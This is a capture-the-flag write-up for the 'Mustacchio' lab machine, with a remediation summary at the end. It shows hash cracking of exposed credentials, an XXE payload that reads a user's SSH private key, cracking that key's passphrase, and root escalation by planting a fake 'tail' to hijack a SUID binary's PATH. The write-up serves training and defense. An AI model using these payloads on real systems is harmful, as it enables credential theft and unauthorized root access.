# Mustacchio

Level: Easy
Date: May 04, 2026
Target IP: 10.114.175.212

## Description

```
Easy boot2root machine with 2 flags.

- User flag
- Root flag
```

## Initial enumeration

Initial nmap scan:
```
nmap -sCV $IP
```

![[Pasted image 20260504175355.png]]

Open ports:
- Port 22 (SSH)
- Port 80 (HTTP)

## Webserver enumeration

It's a webpage designed for mustache-inspiration.

![[Pasted image 20260504175610.png]]

There wasn't much of interest found on the webpage so I ran Gobuster to see if there are any directories associated with the page.
```
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,py,txt,js
```

Gobuster output:

![[Pasted image 20260504180557.png]]

Most of them are found on the webpage but a few of them are new:

- /robots.txt:

![[Pasted image 20260504180802.png]]

- /custom

![[Pasted image 20260504180847.png]]

The css/ folder doesn't have anything interesting, but js/ on the other hand.

- js/

![[Pasted image 20260504181020.png]]

Users seems interesting, let's curl it to see if I'm right.

```
curl http://10.114.175.212/custom/js/users.bak --output users.txt
```

Admin and some kind of hash.
![[Pasted image 20260504181110.png]]

Using crackstation to crack the hash.

![[Pasted image 20260504181650.png]]

Or if you prefer john.

![[Pasted image 20260504181817.png]]
### Credentials found

- admin:bulldog19

## Further enumeration

I tried connecting via ssh but with no luck (sadly forgot to take a picture of that). So I did some further enumeration and found a new HTTP port.

Extended nmap scan:
```
nmap -sV -p 1-10000 10.114.175.212
```

![[Pasted image 20260504195209.png]]

New open ports found:
- Port 8765 (HTTP)

Credentials used to log in from earlier, user=admin & password=bulldog19

![[Pasted image 20260504183817.png]]

The admin panel has comments for the webpage. And the source code tells me there is another user "Barry" that can SSH. From the nmap scan I am assuming there is a RSA-key somewhere.

![[Pasted image 20260504184444.png]]


![[Pasted image 20260504184204.png]]

And there is more interesting stuff in the page source.

![[Pasted image 20260504184632.png]]

```
/auth/dontforget.bak
```

Let's curl that too and see what we get

```
curl http://10.114.175.212:8765/auth/dontforget.bak > dontforget.txt
```

Nothing of interest, just a bunch of text saying I'm wasting my time.
![[Pasted image 20260504184859.png]]


### XXE
Although the function hints that I should insert XML code. Also called XXE (XML External Entity Injection). 
Allows for reading local files via the `file://` protocol, similar in impact to LFI but triggered through XML parsing instead.

Inserting this into the comment field on the front page.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<root>
    <name>&xxe;</name>
    <author>test</author>
    <comment>test</comment>
</root>
```


And there we have the RSA key for Barry.
![[Pasted image 20260504185333.png]]


Had some trouble to get the key in the right format so I used a script for it in python.
```python
with open('id_rsa_raw.txt') as f:
    raw = f.read().strip()

raw = raw.replace('-----BEGIN RSA PRIVATE KEY-----', '')
raw = raw.replace('-----END RSA PRIVATE KEY-----', '')

raw = raw.strip()

dek_start = raw.index('DEK-Info:')
dek_end = raw.index(' ', dek_start + 50)  # after the DEK value
headers = raw[:dek_end].strip()
body = raw[dek_end:].strip().replace(' ', '')

body_wrapped = '\n'.join([body[i:i+64] for i in range(0, len(body), 64)])

result = '-----BEGIN RSA PRIVATE KEY-----\n'
result += headers.replace(' Proc-Type', '\nProc-Type').replace(' DEK-Info', '\nDEK-Info')
result += '\n\n' + body_wrapped
result += '\n-----END RSA PRIVATE KEY-----\n'

with open('id_rsa', 'w') as f:
    f.write(result)
print(result[:200])
```

Once done, use:
```
chmod 600 id_rsa
```

And then:
```
ssh -i id_rsa barry@$IP
```


The key is password-protected, john can fix that.
![[Pasted image 20260504190907.png]]

![[Pasted image 20260504191256.png]]


Here we have the first flag
![[Pasted image 20260504191539.png]]


Poking around, we find Joe's directory with a SUID bit owned by root.
![[Pasted image 20260504192008.png]]

```
strings live_log
```

This can be used to escalate to root. This is vulnerable for PATH hijacking.
![[Pasted image 20260504192333.png]]

Create a fake tail (the "-p" is extremely important, otherwise you drop the privileges)
```
echo '/bin/bash -p' > /tmp/tail

chmod +x /tmp/tail
```

Manipulate PATH
```
export PATH=/tmp:$PATH
```

Run the file
```
./live_log
```

![[Pasted image 20260504192757.png]]

And there is the second flag.

![[Pasted image 20260504192833.png]]

## Summary

### Attack Chain
1. **Web Enumeration** → Gobuster discovered `/custom/js/users.bak` containing admin credentials
2. **Password Cracking** → Cracked SHA1 hash to recover password: `bulldog19`
3. **Hidden Service Discovery** → Full port scan revealed admin panel on port `8765`
4. **XXE Exploitation** → Injected XML payload to read Barry's SSH private key via file:// protocol
5. **SSH Key Cracking** → Used `ssh2john` + `john` to crack the key passphrase
6. **Initial Access** → SSH as Barry using the decrypted private key
7. **Privilege Escalation** → SUID binary `live_log` vulnerable to PATH hijacking via unqualified `tail` call
8. **Root Access** → Spawned root shell by placing malicious `tail` script in `/tmp`

### Key Vulnerabilities
**1. Sensitive File Exposure**

```
/custom/js/users.bak  →  admin credentials exposed
```

- Backup file publicly accessible with no authentication
- Contained username and unsalted SHA1 password hash

**2. XXE Injection**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
```

- No XML input sanitization
- Allowed arbitrary file read as the web server user
- Exposed SSH private key

**3. Information Disclosure**

```html
<!-- Barry, you can now SSH in using your key!-->
document.cookie = "Example=/auth/dontforget.bak";
```

- HTML comments leaking usernames and file paths
- Client-side JavaScript exposing internal paths

**4. SUID Binary with PATH Hijacking**

```bash
strings live_log → tail -f /var/log/nginx/access.log
```

- SUID binary owned by root
- Calls `tail` without absolute path
- Allows PATH manipulation to execute arbitrary code as root

### Security Recommendations

**1. File Exposure**

- Never store backup files in web-accessible directories
- Implement proper `.htaccess` rules or move sensitive files outside webroot

**2. XXE Prevention**

```python
# Disable external entities in XML parser
parser = etree.XMLParser(resolve_entities=False)
```

- Disable external entity processing in XML parsers
- Validate and whitelist all XML input

**3. Source Code & Comments**

- Strip all comments from production HTML/JS
- Never expose internal paths or usernames in client-side code

**4. SUID Binaries**

```bash
# Bad
tail -f /var/log/nginx/access.log

# Good  
/usr/bin/tail -f /var/log/nginx/access.log
```

- Always use absolute paths in SUID binaries
- Audit SUID binaries regularly: `find / -perm -4000 2>/dev/null`
- Apply principle of least privilege

### Tools used

- **nmap** — Port scanning and service detection
- **Gobuster** — Web directory enumeration
- **curl** — File retrieval from web server
- **CrackStation / john** — Hash and passphrase cracking
- **ssh2john** — Converting SSH keys to crackable format
- **Python** — PEM key reformatting script

### Lessons learned

1. **Always do full port scans** — Hidden services on non-standard ports are common, `-p-` is essential
2. **Check backup files** — `.bak`, `.old`, `.txt` extensions in web directories often contain sensitive data
3. **Read source code thoroughly** — HTML comments and JavaScript can leak usernames, paths and hints
4. **XXE is powerful for file read** — Anywhere XML is accepted, test for external entity injection
5. **SUID binaries need scrutiny** — `strings` on a SUID binary can instantly reveal PATH hijacking opportunities
6. **Encrypted keys aren't safe** — Weak passphrases are quickly cracked with rockyou.txt
